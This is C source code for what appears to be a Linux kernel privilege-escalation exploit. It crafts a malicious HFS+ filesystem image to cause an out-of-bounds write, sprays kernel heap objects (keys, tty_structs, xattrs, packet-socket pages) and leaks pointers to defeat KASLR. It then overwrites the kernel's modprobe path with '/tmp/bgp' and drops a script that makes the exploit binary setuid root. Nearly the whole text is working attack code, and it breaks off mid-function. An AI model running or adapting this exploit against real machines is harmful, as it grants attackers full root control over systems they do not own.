void hack_hfs_keyring(unsigned char *hfs_buffer, size_t len, uint64_t dummy)
{
    /* Let's check some basic information about our volume */
    parse_volume(hfs_buffer, len);

    /* First, we hack the attribute B-tree a little bit */
    resize_nodes(hfs_buffer, len);

    /* Remove root */
    remove_root(hfs_buffer, len);

    /* Corrupt key length */
    corrupt_key_len(hfs_buffer, len, 0x418 - 2);

    uint8_t payload[24] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xff, 0xff, 0x53, 0x53, 0x53, 0x53, 0x53, 0x53
    };

    uint16_t payload_len = sizeof(payload);

    /* Write kmalloc-1k payload */
    write_payload(hfs_buffer, len, payload, payload_len);
}

void hack_hfs_modprobe_one(unsigned char *hfs_buffer, size_t len, uint64_t kaslr_base)
{
    /* Let's check some basic information about our volume */
    parse_volume(hfs_buffer, len);

    /* First, we hack the attribute B-tree a little bit */
    resize_nodes(hfs_buffer, len);

    /* Remove root */
    remove_root(hfs_buffer, len);

    /* Corrupt key length */
    /* -2 of what you want because fs/hfsplus/bnode.c#L66*/
    corrupt_key_len(hfs_buffer, len, 0x410 - 2);

/*
    uint8_t payload[24] = {
    0x3c, 0xf6, 0xb3, 0x82, 0xff, 0xff, 0xff, 0xff,
    0x2f, 0x62, 0x67, 0x70, 0x81, 0x88, 0xff, 0xff, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
*/

/*00000000: 38f6 b382 ffff ffff 2f74 6d70 8188 ffff  8......./tmp....                                                                                          â”‚*/
    uint8_t payload[16] = {
    0x38, 0xf6, 0xb3, 0x82, 0xff, 0xff, 0xff, 0xff,
    0x2f, 0x74, 0x6d, 0x70, 0x81, 0x88, 0xff, 0xff
    };

    if (kaslr_base) {
// (gdb) set *(long*)(0xffff8881019be000) = 0xffffffff82b3f638                                                                                                  
// (gdb) set *(long*)(0xffff8881019be008) = 0xffff8881706d742f   
/*
#define MODPROBE_ADDR_ONE 0xffffffff82b3f638
#define MODPROBE_ADDE_TWO 0xffffffff82b3f63c

#define KERNEL_BASE 0xffffffff81000000
*/

        printf("[+] Fixing up first payload with kaslr base: %lx\n", kaslr_base);
        uint64_t target = MODPROBE_ADDR_ONE - KERNEL_BASE + kaslr_base;
        for (int i = 0; i < 8; i++) {
            payload[i] = (uint8_t)((target >> (8 * i)) & 0xFF);
        }
    }


    uint16_t payload_len = sizeof(payload);

    /* Write kmalloc-1k payload */
    write_payload(hfs_buffer, len, payload, payload_len);
}

void hack_hfs_modprobe_two(unsigned char *hfs_buffer, size_t len, uint64_t kaslr_base)
{
    /* Let's check some basic information about our volume */
    parse_volume(hfs_buffer, len);

    /* First, we hack the attribute B-tree a little bit */
    resize_nodes(hfs_buffer, len);

    /* Remove root */
    remove_root(hfs_buffer, len);

    /* Corrupt key length */
    /* -2 of what you want because fs/hfsplus/bnode.c#L66*/
    corrupt_key_len(hfs_buffer, len, 0x410 - 2);

/*00000000: 3cf6 b382 ffff ffff 2f62 6770 8188 ffff  <......./bgp....         */

    uint8_t payload[16] = {
    0x3c, 0xf6, 0xb3, 0x82, 0xff, 0xff, 0xff, 0xff,
    0x2f, 0x62, 0x67, 0x70, 0x81, 0x88, 0xff, 0xff
    };

    if (kaslr_base) {
// (gdb) set *(long*)(0xffff8881019be000) = 0xffffffff82b3f638                                                                                                  
// (gdb) set *(long*)(0xffff8881019be008) = 0xffff8881706d742f   
/*
#define MODPROBE_ADDR_ONE 0xffffffff82b3f638
#define MODPROBE_ADDE_TWO 0xffffffff82b3f63c

#define KERNEL_BASE 0xffffffff81000000
*/

        printf("[+] Fixing up first payload with kaslr base: %lx\n", kaslr_base);
        uint64_t target = MODPROBE_ADDR_TWO - KERNEL_BASE + kaslr_base;
        for (int i = 0; i < 8; i++) {
            payload[i] = (uint8_t)((target >> (8 * i)) & 0xFF);
        }
    }


    uint16_t payload_len = sizeof(payload);

    /* Write kmalloc-1k payload */
    write_payload(hfs_buffer, len, payload, payload_len);
}

/* Function to decompress data using zlib with gzip format */
int decompress_gzip(const unsigned char *src, size_t src_len, unsigned char **dest, size_t *dest_len)
{
    z_stream strm;
    int ret;
    size_t output_size = CHUNK;  /* Initial buffer size */

    /* Allocate memory for the destination buffer */
    *dest = malloc(output_size);
    if (*dest == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return Z_MEM_ERROR;
    }

    /* Initialize the zlib stream structure */
    strm.zalloc = Z_NULL;
    strm.zfree = Z_NULL;
    strm.opaque = Z_NULL;
    strm.avail_in = src_len;
    strm.next_in = (unsigned char *)src;

    /* Initialize the zlib stream for decompression in gzip mode */
    /* 16 + MAX_WBITS enables gzip format */
    ret = inflateInit2(&strm, 16 + MAX_WBITS);
    if (ret != Z_OK) {
        /* Clean up on failure */
        free(*dest);
        return ret;
    }

    /* Track total output size */
    size_t total_out = 0;

    do {
        if (total_out + CHUNK > output_size) {
            /* Resize the buffer if it's not big enough */
            output_size += CHUNK;
            unsigned char *new_dest = realloc(*dest, output_size);

            if (new_dest == NULL) {
                inflateEnd(&strm);
                free(*dest);
                fprintf(stderr, "Reallocation failed\n");
                return Z_MEM_ERROR;
            }
            *dest = new_dest;
        }

        strm.avail_out = CHUNK;
        strm.next_out = *dest + total_out;

        /* Perform the decompression */
        ret = inflate(&strm, Z_NO_FLUSH);
        if (ret == Z_STREAM_ERROR) {
            inflateEnd(&strm);
            free(*dest);
            fprintf(stderr, "Stream error during inflation\n");
            return ret;
        }
        /* Update total output size */
        total_out += CHUNK - strm.avail_out;
    } while (ret != Z_STREAM_END);

    /* Set the actual output length */
    *dest_len = total_out;

    /* Clean up */
    inflateEnd(&strm);
    return Z_OK;
}

int prepare_filesystem(void (*hfs_mutator)(unsigned char *, size_t, uint64_t), char *hfs_filename, uint64_t kaslr_base)
{
    unsigned char *compressed_data = vanilla_hfs_bin;
    size_t compressed_size = vanilla_hfs_bin_len;

    /* Output buffer */
    unsigned char *decompressed = NULL;
    size_t decompressed_len = 0;

    /* Decompress 3 times */
    for (int i = 0; i < 3; i++) {
        if (decompress_gzip(compressed_data, compressed_size, &decompressed, &decompressed_len) != Z_OK) {
            fprintf(stderr, "Decompression failed at iteration %d\n", i + 1);
            return 1;
        }
        /* For the next round, the output becomes the input */
        compressed_size = decompressed_len;
        /* Reuse the decompressed data as input */
        compressed_data = decompressed;
    }
    printf("[+] Decompressed size: 0x%lx\n", decompressed_len);

    hfs_mutator(decompressed, decompressed_len, kaslr_base);

    FILE *file = fopen(hfs_filename, "wb");
    size_t written = fwrite(decompressed, sizeof(unsigned char), decompressed_len, file);

    if (written != decompressed_len) {
        perror("Failed to write the buffer to the file");
        fclose(file);
        exit(EXIT_FAILURE);
    }
    fclose(file);

    /* Free the allocated memory */
    free(decompressed);

    return 0;
}

long long get_precise_time(void)
{
    struct timespec ts;

    clock_gettime(CLOCK_REALTIME, &ts);
    long long milliseconds_since_epoch =
                (long long)(ts.tv_sec) * 1000 + (long long)(ts.tv_nsec) / 1000000;
    return milliseconds_since_epoch;
}

/* Function to check if a pointer is a valid kernel pointer within the KASLR range */
bool is_valid_pointer(uint64_t ptr)
{
/*    if (ptr >= KERNEL_BASE_LOWER && ptr <= KERNEL_BASE_UPPER)
 *        printf("Valid pointer: %lx\n", ptr);
 */
    return (ptr >= KERNEL_BASE_LOWER && ptr <= KERNEL_BASE_UPPER);
}

/* Function to extract a 64-bit pointer from a byte buffer at a given position */
uint64_t extract_pointer(uint8_t *buffer, int pos)
{
    uint64_t ptr = 0;

    for (int i = 0; i < 8; i++) {
        /* Extract 8 bytes as a 64-bit pointer */
        ptr |= ((uint64_t)buffer[pos + i] << (i * 8));
    }
    return ptr;
}

/* Function to search for pointer triples and calculate KASLR base */
void find_pointer_triples(uint8_t *buffer, int buffer_size, int *success, uint64_t *kaslr_base_out)
{
    for (int i = 0; i < buffer_size - 8; i++) {
        /* Extract the first pointer */
        uint64_t first_ptr = extract_pointer(buffer, i);

        if (!is_valid_pointer(first_ptr))
            /* Skip invalid pointers */
            continue;


        /* Extract the second pointer at the offset */
        int second_ptr_pos = i + OFFSET_2ND_PTR;

        if (second_ptr_pos + 8 > buffer_size)
            continue;

        uint64_t second_ptr = extract_pointer(buffer, second_ptr_pos);

        if (!is_valid_pointer(second_ptr))
            continue;


        /* Extract the third pointer at the next offset */
        int third_ptr_pos = second_ptr_pos + OFFSET_3RD_PTR - OFFSET_2ND_PTR;

        if (third_ptr_pos + 8 > buffer_size)
            continue;

        uint64_t third_ptr = extract_pointer(buffer, third_ptr_pos);

        if (!is_valid_pointer(third_ptr))
            continue;

        /* Calculate the differences */
        int64_t diff_first = first_ptr - BASE_ADDR_FIRST;
        int64_t diff_second = second_ptr - BASE_ADDR_SECOND;
        int64_t diff_third = third_ptr - BASE_ADDR_THIRD;

        printf("\n[+] Pointer triple found at byte offset %x:\n", i);
        printf("\tFirst pointer:  0x%lx (Difference: 0x%lx)\n", first_ptr, diff_first);
        printf("\tSecond pointer: 0x%lx (Difference: 0x%lx)\n", second_ptr, diff_second);
        printf("\tThird pointer:  0x%lx (Difference: 0x%lx)\n", third_ptr, diff_third);

        /* If all three differences match, calculate the KASLR base */
        if (diff_first == diff_second && diff_first == diff_third) {
            uint64_t kaslr_base = diff_first + KERNEL_BASE;

            printf("\n[+] KASLR base: 0x%lx\n", kaslr_base);
            *success = 1;
            *kaslr_base_out = kaslr_base;

            /* Stop once we find the KASLR base */
            return;
        }
    }
}


sem_t *make_semaphore(int initial){
    int shm = shmget(IPC_PRIVATE, sizeof(sem_t), IPC_CREAT | 0666);

    sem_t *semaphore = shmat(shm, NULL, 0);
    sem_init(semaphore, 1, initial);
    return semaphore;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        do_error_exit("sched_setaffinity");
}

void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}


void unshare_setup_xattr(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];

    ret = unshare(CLONE_NEWNS | CLONE_NEWUSER);
    if (ret < 0)
        do_error_exit("unshare");

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1\n", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1\n", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    ret = mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);
    if (ret < 0)
        perror("mount root");   
}

void write_file(char *path, char *buf, int size)
{
    int fd = open(path, O_RDWR|O_CREAT);

    write(fd, buf, size);
    close(fd);
}

void prepare_mounts(void)
{
    system("mkdir /tmp/mnt0");
    system("mkdir /tmp/mnt1");  
    system("mkdir /tmp/mnt2");  
}


void prepare_tmpfs(void)
{
    system("mkdir /tmp/tmpfs");
    system("mount -t tmpfs -o size=50M none /tmp/tmpfs");

    write_file("/tmp/tmpfs/xattr_node", "data", 0x4);
    write_file("/tmp/tmpfs/xattr_node_2", "data", 0x4);
    write_file("/tmp/tmpfs/xattr_node_3", "data", 0x4);
}

void unlink_xattr(int id)
{
    char xattr_name[XATTR_NAME_MAX_SIZE];

    snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%d", id);
    removexattr("/tmp/tmpfs/xattr_node", xattr_name);
}

void spray_xattr(void)
{
    char xattr_name[XATTR_NAME_MAX_SIZE];
    char xattr_value[XATTR_NAME_MAX_SIZE];

    int base_nodes[] = {7, 3, 11, 1, 5, 9, 13};
    int leaf_nodes[] = {0, 2, 4, 6, 8, 10, 12, 14};
    int base_size = sizeof(base_nodes) / sizeof(base_nodes[0]);
    int leaf_size = sizeof(leaf_nodes) / sizeof(leaf_nodes[0]);

    for (int i = 100; i < 111; i++) {
        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, "attilaszia-%d%512d", i, i);
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%d", i);
        setxattr("/tmp/tmpfs/xattr_node_3", xattr_name, xattr_value, strlen(xattr_value), 0);
    }


    for (int i = 0; i < base_size; i++) {
        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, "attilaszia-%d%512d", base_nodes[i], base_nodes[i]);
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%02d", base_nodes[i]);
        setxattr("/tmp/tmpfs/xattr_node", xattr_name, xattr_value, strlen(xattr_value), 0);
    }

    for (int i = 0; i < leaf_size; i++) {
        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, "attilaszia-%d%512d", leaf_nodes[i], leaf_nodes[i]);
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%02d", leaf_nodes[i]);
        setxattr("/tmp/tmpfs/xattr_node", xattr_name, xattr_value, strlen(xattr_value), 0);
    }
}

void spray_xattr_two(void)
{
    char xattr_name[XATTR_NAME_MAX_SIZE];
    char xattr_value[XATTR_NAME_MAX_SIZE];

    int base_nodes[] = {7, 3, 11, 1, 5, 9, 13};
    int leaf_nodes[] = {0, 2, 4, 6, 8, 10, 12, 14};
    int base_size = sizeof(base_nodes) / sizeof(base_nodes[0]);
    int leaf_size = sizeof(leaf_nodes) / sizeof(leaf_nodes[0]);


    for (int i = 200; i < 211; i++) {
        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, "attilaszia-%d%512d", i, i);
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%d", i);
        setxattr("/tmp/tmpfs/xattr_node_3", xattr_name, xattr_value, strlen(xattr_value), 0);
    }

    for (int i = 0; i < base_size; i++) {
        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, "attilaszia-%d%512d", base_nodes[i], base_nodes[i]);
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%02d", base_nodes[i]);
        setxattr("/tmp/tmpfs/xattr_node_2", xattr_name, xattr_value, strlen(xattr_value), 0);
    }

    for (int i = 0; i < leaf_size; i++) {
        snprintf(xattr_value, XATTR_NAME_MAX_SIZE, "attilaszia-%d%512d", leaf_nodes[i], leaf_nodes[i]);
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%02d", leaf_nodes[i]);
        setxattr("/tmp/tmpfs/xattr_node_2", xattr_name, xattr_value, strlen(xattr_value), 0);
    }
}

char *read_modprobe_content(void) 
{
    FILE *file;
    char buffer[BUFFER_SIZE];
    char *content;

    file = fopen(MODPROBE_PATH, "r");
    if (file == NULL) {
        perror("Failed to open /proc/sys/kernel/modprobe");
        return NULL;
    }
    if (fgets(buffer, sizeof(buffer), file) == NULL) {
        perror("Failed to read from /proc/sys/kernel/modprobe");
        fclose(file);
        return NULL;
    }   
    content = (char*)malloc(strlen(buffer) + 1);
    if (content == NULL) {
        perror("Failed to allocate memory");
        fclose(file);
        return NULL;
    }
    strcpy(content, buffer);    
    fclose(file);   

    size_t len = strlen(content);

    if (len > 0 && content[len - 1] == '\n') {
        content[len - 1] = '\0';
    }

    return content;
}

int check_modprobe(void)
{
    const char *fixed_string = "/sbin/modprobe";

    usleep(100000);

    char *modprobe_content = read_modprobe_content();
    if (modprobe_content != NULL) {
        printf("[+] modprobe: %s\n", modprobe_content);
            return strcmp(modprobe_content, fixed_string);
        }   
    else {
        do_error_exit("check_modprobe couldn't read modprobe content");
    }
}

int check_modprobe_final(void)
{
    const char *fixed_string = "/tmp/bgp";

    usleep(100000);

    char *modprobe_content = read_modprobe_content();
    if (modprobe_content != NULL) {
        printf("[+] modprobe: %s\n", modprobe_content);
            return !strncmp(modprobe_content, fixed_string, 8);
        }   
    else {
        do_error_exit("check_modprobe couldn't read modprobe content");
    }
}



void check_for_modprobe_overwrite_one(void){
    char xattr_name[XATTR_NAME_MAX_SIZE];
    char xattr_value[XATTR_NAME_MAX_SIZE];

    int redblack[] = {0, 2, 4, 6, 8, 10, 12, 14};

    int success = false;

    printf("[+] Checking for xattr corruptions\n");

    int array_size = sizeof(redblack) / sizeof(redblack[0]);
    for (int i = 0; i < array_size; i++) {              
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%02d", redblack[i]);
        printf("[+] current xattr to delete: %s\n", xattr_name);

        /* rbtree __rb_change_child should happen here */
        removexattr("/tmp/tmpfs/xattr_node", xattr_name);

        if (check_modprobe()) {
            printf("[+] Successfully corrupted modprobe path #1\n");            
            fflush(stdout);

            system("cat /proc/sys/kernel/modprobe");            
            success = true;
            sleep(1);
            break;
        }
    }
    if (!success){
        sleep(1);
        do_error_exit("Couldn't overwrite first part of modprobe");     
    }

}

void check_for_modprobe_overwrite_two(void){
    char xattr_name[XATTR_NAME_MAX_SIZE];
    char xattr_value[XATTR_NAME_MAX_SIZE];

    int redblack[] = {0, 2, 4, 6, 8, 10, 12, 14};

    int success = false;

    printf("[+] Checking for xattr corruptions\n");

    int array_size = sizeof(redblack) / sizeof(redblack[0]);
    for (int i = 0; i < array_size; i++) {              
        snprintf(xattr_name, XATTR_NAME_MAX_SIZE, "security.%02d", redblack[i]);
        printf("[+] current xattr to delete: %s\n", xattr_name);

        /* rbtree __rb_change_child should happen here */
        removexattr("/tmp/tmpfs/xattr_node_2", xattr_name);

        if (check_modprobe_final()) {
            printf("[+] Successfully corrupted modprobe path #2\n");            
            fflush(stdout);

            system("cat /proc/sys/kernel/modprobe");            
            success = true;
            sleep(5);
            break;
        }
    }
    if (!success){
        sleep(1);
        do_error_exit("Couldn't overwrite modprobe");       
    }

}

void trigger_oob(void)
{
    key_serial_t *id_buffer;

    id_buffer = spray_keyring(SPRAY_KEY_SIZE, SPRAY_KEY_SIZE_INIT);

    spray_tty_struct(SPRAY_TTY_SIZE);

    char *attr_value = "dummy";
    int result = setxattr("/tmp/mnt0/hacked_node", "user.1", attr_value, strlen(attr_value), 0);

    if (result != 0)
        do_error_exit("setxattr attempt on vuln fs");

    kaslr_base_recovered = get_keyring_leak(id_buffer, (uint32_t)SPRAY_KEY_SIZE);
    sleep(1);

    release_keys(id_buffer, SPRAY_KEY_SIZE);
}

void trigger_oob_xattr(void)
{
    char *attr_value = "dummy";
    int result = setxattr("/tmp/mnt1/hacked_node", "user.1", attr_value, strlen(attr_value), 0);

    if (result != 0)
        do_error_exit("setxattr attempt on vuln fs");   
}

void trigger_oob_xattr_two(void)
{
    char *attr_value = "dummy";
    int result = setxattr("/tmp/mnt2/hacked_node", "user.1", attr_value, strlen(attr_value), 0);

    if (result != 0)
        do_error_exit("setxattr attempt on vuln fs");   
}


/* Function to monitor /proc/contig_alloc_info */
void *monitor_function(void *arg)
{
    int consecutive_ones = 0;

    const int required_consecutive = 10;
    /* 0.1 seconds in microseconds */
    const useconds_t interval = 100000;

    while (1) {
        char buffer[128];
        FILE *file;

        /* Open the file for reading */
        file = fopen("/proc/contig_alloc_info", "r");
        if (file == NULL) {
            perror("Failed to open /proc/contig_alloc_info");
            pthread_exit(NULL);
        }

        /* Read a line from the file */
        if (fgets(buffer, sizeof(buffer), file) != NULL) {
            int value;
            char timestamp[64];

            /* Parse the timestamp and value */
            if (sscanf(buffer, "%s %d", timestamp, &value) == 2) {
                if (value == 1) {
                    consecutive_ones++;
                    if (consecutive_ones == required_consecutive) {
                        printf("Value is 1 for %d consecutive checks at %s\n", required_consecutive, timestamp);
                        printf("UNIX timestamp at side-channel trigger: %lld\n", get_precise_time());
                        // trigger_oob();
                    }
                } else {
                    /* Reset the counter if value is not 1 */
                    consecutive_ones = 0;
                }
            } else {
                fprintf(stderr, "Failed to parse the line: %s", buffer);
            }
        } else {
            fprintf(stderr, "Failed to read from /proc/contig_alloc_info\n");
        }

        fclose(file);

        usleep(interval);
    }
    return NULL;
}

void print_contiginfo(void)
{
    char buffer[128];
    FILE *pipe;

    pipe = popen("cat /proc/contig_alloc_info", "r");
    if (pipe == NULL) {
        do_error_exit("popen failed");
    return;
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        printf("%s", buffer);

    pclose(pipe);
}

void print_buddyinfo(void)
{
    char buffer[128];
    FILE *pipe;

    pipe = popen("cat /proc/buddyinfo", "r");
    if (pipe == NULL)
        do_error_exit("popen failed");

    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        printf("%s", buffer);

    pclose(pipe);
}

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[-] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[-] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[-] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

int exit_child(void) {
    struct pgv_page_request req = {     
        .cmd = CMD_EXIT
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret; 
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    usleep(10000);

    return ret;
}

void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* Create an isolated namespace*/
    unshare_setup();

    /* Handle requests */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else if (req.cmd == CMD_EXIT) {
            ret = 0;
            write(cmd_pipe_reply[1], &ret, sizeof(ret));
            printf("[+] Exiting\n");
            break;          
        } else {            
            printf("[-] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);

    printf("[+] Finished command handler\n");
    _exit(0);
}

pid_t prepare_pgv_system(void)
{
    pid_t pid;
    /* Pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);

    /* Child process for pages spray */
    pid = fork();
    if (!pid)
        spray_cmd_handler();
    else {
        printf("[+] Kicked off spray process %d\n", pid);
        return pid;
    }
}

/* Spray pages in different size for various usages and trigger first OOB */
void prepare_pgv_pages_cross_oob(void)
{
#ifdef DEBUG_CROSSCACHE
    print_contiginfo();
    print_buddyinfo();
#endif    
    /*
     * We want a more clear and continuous memory there, which require us to
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0)
            printf("[-] failed to create %d socket for pages spraying!\n", i);
    }
#ifdef DEBUG_CROSSCACHE
    print_contiginfo();
    print_buddyinfo();
#endif    


    puts("[*] spray pgv order-1 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000 * 2, 1) < 0)
            printf("[-] failed to create %d socket for pages spraying!\n", i);
    }

#ifdef DEBUG_CROSSCACHE
    print_contiginfo();
    print_buddyinfo();
#endif
    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (i == 2) {
            /* This looks arbitrary AF, but I made a bunch of measurements and undergrad level stats that support it */
            usleep(166000);

            printf("[+] UNIX timestamp at page-2 splitting: %lld\n", get_precise_time());
            trigger_oob();
        }

        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0)
            printf("[-] failed to create %d socket for pages spraying!\n", i);
    }

#ifdef DEBUG_CROSSCACHE
    print_contiginfo();
    print_buddyinfo();
#endif

    /* Spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* A socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0)
            free_page(pgv_4pages_start_idx++);

        /* A socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0)
            free_page(pgv_1page_start_idx += 2);

        /* A pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0)
            free_page(pgv_1page_start_idx += 2);

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0)
            printf("[-] failed to create %d socket for pages spraying!\n", i);
    }
#ifdef DEBUG_CROSSCACHE    
    print_contiginfo();
    print_buddyinfo();
#endif    
}

uint64_t parse_leak(uint8_t *buffer, uint32_t buffer_size)
{
    int success;
    uint64_t kaslr_base_found;
/*
    for (uint32_t i = 0; i < buffer_size; i++)
        printf("%02x", buffer[i]);
    printf("\n");
*/    
    success = 0;

    /* Process the buffer to find pointer triples and calculate KASLR base */
    find_pointer_triples(buffer, buffer_size, &success, &kaslr_base_found);
    if (!success)
        do_error_exit("Could not recover KASLR base\n");

    return kaslr_base_found;
}

void spray_tty_struct(int max)
{
    int spray[100];

    printf("[+] Spraying tty_structs\n");

    for (int i = 0; i < max; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    }
}


key_serial_t *spray_keyring(uint32_t spray_size, uint32_t offset)
{
    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        do_error_exit("calloc");

    printf("[+] Spraying keys...");
    for (uint32_t i = 0; i < spray_size; i++) {     
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "attilaszia-%d%498d", offset + i, offset + i);

        id_buffer[i] = add_key("user", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            do_error_exit("add_key");
    }
    printf("done\n");

    return id_buffer;
}

uint64_t get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size)
{
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    printf("[+] Checking sprayed keys for corruption\n");
    for (uint32_t i = 0; i < id_buffer_size; i++) {

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);

        if (keylen < 0)
            continue;

        if (keylen > 1024) {
            printf("[+] Found corrupted key, triggering infoleak\n");
            return parse_leak(buffer, keylen);
        }
    }
    return 0;
}

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size)
{
    printf("[+] Releasing %d keys\n", id_buffer_size);

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
            perror("keyctl(KEYCTL_REVOKE)");
        if (keyctl(KEYCTL_UNLINK, id_buffer[i], KEY_SPEC_PROCESS_KEYRING, 0, 0) < 0)
            perror("keyctl(KEYCTL_UNLINK)");
    }

    free(id_buffer);
}


int qemu_mount_oracle(char *file_path, char *loop_device_path, char *mount_point)
{
    char command[1024];
    snprintf(command, sizeof(command), "/qemu_oracle mount %s %s %s", file_path, loop_device_path, mount_point);
    system(command);

    return 0;
}

int qemu_umount_oracle(char *file_path, char *loop_device_path, char *mount_point)
{
    char command[1024];
    snprintf(command, sizeof(command), "/qemu_oracle unmount %s %s %s", file_path, loop_device_path, mount_point);
    system(command);

    return 0;
}

void set_myself_suid(char *my_path)
{
    char *script = malloc(0x200);
    char *modprobe_path = read_modprobe_content();

    sprintf(script, "#!/bin/bash\nchown root:root %s\nchmod u+s %s\n", my_path, my_path);   
    write_file(modprobe_path, script, strlen(script));

